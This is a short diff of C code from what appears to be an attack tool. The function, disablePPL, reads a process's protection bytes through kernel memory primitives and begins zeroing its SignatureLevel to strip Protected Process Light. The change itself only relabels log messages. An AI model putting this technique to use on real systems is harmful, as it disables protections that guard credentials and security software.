@@ -162,11 +162,11 @@ void disablePPL() {
             
             log_info("Original protection values:");
             OriginalSigLv = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 2);
-            log_info("\tProtection value: 0x%02X", OriginalSigLv);
+            log_info("\tSigLv value: 0x%02X", OriginalSigLv);
             OriginalSecSigLv = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection - 1);
-            log_info("\tProtection value: 0x%02X", OriginalSecSigLv);
+            log_info("\tSecSigLv value: 0x%02X", OriginalSecSigLv);
             OriginalProt = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
-            log_info("\tProtection value: 0x%02X", OriginalProt);
+            log_info("\tProt value: 0x%02X", OriginalProt);
 
             // Disable
             WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 2, 0x00); // SignatureLevel
